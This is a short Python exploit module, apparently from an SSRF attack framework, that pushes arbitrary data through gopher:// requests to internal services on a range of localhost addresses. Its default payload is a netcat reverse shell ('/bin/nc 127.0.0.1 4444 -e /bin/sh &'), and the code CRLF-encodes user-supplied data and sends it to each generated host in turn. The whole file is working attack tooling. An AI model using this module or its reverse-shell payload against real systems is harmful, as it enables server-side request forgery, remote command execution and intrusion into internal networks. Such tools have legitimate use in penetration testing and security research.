from core.utils import *
import urllib.parse
import logging

name          = "custom"
description   = "Send custom data to a listening service, e.g: netcat"
author        = "Swissky"
documentation = []

class exploit():
    SERVICE_IP   = "127.0.0.1"
    SERVICE_PORT = "8080"
    SERVICE_DATA = "/bin/nc 127.0.0.1 4444 -e /bin/sh &"

    def __init__(self, requester, args):
        logging.info("Module '{}' launched !".format(name))
        gen_host = gen_ip_list("127.0.0.1", args.level)
        SERVICE_PORT = input("Service Port: ")
        SERVICE_DATA = "%0d%0a"+urllib.parse.quote(input("Service Data: "))

        for SERVICE_IP in gen_host:
            payload = wrapper_gopher(SERVICE_DATA, SERVICE_IP, SERVICE_PORT)
            r = requester.do_request(args.param, payload)